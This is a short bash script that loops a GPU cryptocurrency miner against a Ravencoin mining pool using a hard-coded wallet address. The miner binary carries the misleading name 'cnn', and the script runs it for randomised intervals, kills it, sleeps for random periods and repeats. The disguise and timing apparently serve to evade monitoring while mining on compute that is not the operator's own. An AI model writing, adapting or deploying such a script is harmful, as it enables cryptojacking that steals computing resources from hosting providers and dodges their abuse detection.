while :
do

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%120))
	b=800
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=300
	aaram=$(($w+$e))
	timeout -k 5 $c\s   ./cnn/cnn -P stratums://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker@us.ravenminer.com:13802 -U --cu-grid-size 64 --cu-parallel-hash 1 --cu-block-size 256
	timeout -k 5 2s pgrep cnn | xargs kill
	sleep $aaram
	echo "Kartik Bhai Amar Rahe"
done
